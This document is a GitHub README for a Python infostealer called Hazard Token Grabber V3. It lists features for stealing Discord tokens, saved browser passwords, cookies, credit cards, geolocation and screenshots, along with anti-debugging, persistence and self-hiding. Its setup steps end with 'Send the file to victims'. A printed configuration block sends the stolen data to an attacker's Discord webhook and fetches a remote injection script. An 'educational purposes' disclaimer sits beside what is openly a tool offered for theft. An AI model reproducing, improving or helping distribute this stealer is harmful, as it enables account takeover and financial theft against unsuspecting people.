<h1 align="center">
  Hazard Token Grabber V3 🔧
</h1>

<p align="center"> 
  <kbd>
<img src="https://camo.githubusercontent.com/b4909d8c45134b255c5e0c959cbca68f655d044e944c39fdcd91bbbb5d58eb1e/68747470733a2f2f692e646973636f72642e66722f5053532e706e67">
  </kbd>
</p>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/Rdmo1/Hazard-Token-Grabber-V3?style=flat-square">
  <img src="https://img.shields.io/github/last-commit/Rdmo1/Hazard-Token-Grabber-V3?style=flat-square">
  <img src="https://sonarcloud.io/api/project_badges/measure?project=Rdmo1_Hazard-Token-Grabber-V3&metric=ncloc"/>
  <img src="https://img.shields.io/github/stars/Rdmo1/Hazard-Token-Grabber-V3?color=%02B039&label=Stars&style=flat-square">
  <img src="https://img.shields.io/github/forks/Rdmo1/Hazard-Token-Grabber-V3?color=%02B039&label=Forks&style=flat-square">
</p>

<h2 align="center">
  Hazard-Token-Grabber-V3 was made with

CODE 🟩

</h2>

**NOTE:** \
Hazard was made for educational purposes, therefor all consequences caused by your actions are **your** responsibility and accountability.

---

## <a id="content"></a>🌐 〢 Content

- [🔰・Features](#features)
- [🌌・Discord](https://cheataway.com/invite)
- [🎉・Setting up Hazard Token Grabber.V3](#setup)
- [⚙・Config](#config)
- [🔍・Screenshot](#screenshot)

## <a id="features"></a>🔰 〢 Features

```
> Anti-vm/Anti-debug
> Add to startup
> Hides itself
> Supports github.com/Rdmo1/Discord-Webhook-Protector so webhook can't be deleted or spammed
> Options are configurable
> Pretty Fast Even if it Was Made With Python
> Windows Product Key & Build Info
> IP & Geolocation. (Country, City, Google Maps Location)
> A screenshot of all their monitors
> All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
> Their Passwords & Credit Cards for Discord (updates when they change it)
> All Passwords, Cookies and History from Google
> + More!
```

## <img src="https://raw.githubusercontent.com/Rdmo1/images/master/Hazard-Token-Grabber-V3/info.png">

---

## <a id="setup"></a> 📁 〢 Setting up Hazard Token Grabber.V3

1. Install [python](https://www.python.org/) and add it to [path](https://datatofish.com/add-python-to-windows-path/).
2. Open up [main.py](https://github.com/Rdmo1/Hazard-Token-Grabber-V3/blob/master/main.py) with notepad or some other editor
3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your [discord webhook](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks)
4. Double Click `setup.bat` and allow it to finish.
5. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
6. Send the file to victims. 😈

## <a id="config"></a>⚙ 〢 Config

If you want to change the config, open up [main.py](https://github.com/Rdmo1/Hazard-Token-Grabber-V3/blob/master/main.py) and locate it at the top. There you can configure the following:

```py
config = {
    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdmo1/Discord-Webhook-Protector
    # Recommend using https://github.com/Rdmo1/Discord-Webhook-Protector so your webhook can't be spammed or deleted
    'webhook': "WEBHOOK_HERE",
    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdmo1/Discord-Webhook-Protector
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/Rdmo1/Discord-Injection/master/injection.js",
    # if True, it will ping @everyone when someone ran Hazard V3
    'ping_on_run': False,
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': True,
    # if you want the file to run at startup
    'startup': True,
    # if you want the file to hide itself after run
    'hide_self': True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
      ...
    ]

}
```

---
## <a id="screenshot"></a>🔍 〢 Screenshot
<p align="center"> 
  <kbd>
<img src="https://camo.githubusercontent.com/b4909d8c45134b255c5e0c959cbca68f655d044e944c39fdcd91bbbb5d58eb1e/68747470733a2f2f692e646973636f72642e66722f5053532e706e67">
  </kbd>
</p>
<p align="center"> 
  <kbd>
<img src="https://cdn.discordapp.com/attachments/1006899534078685254/1030389613765857301/IMG_20221014_160015.jpg">
  </kbd>
</p>
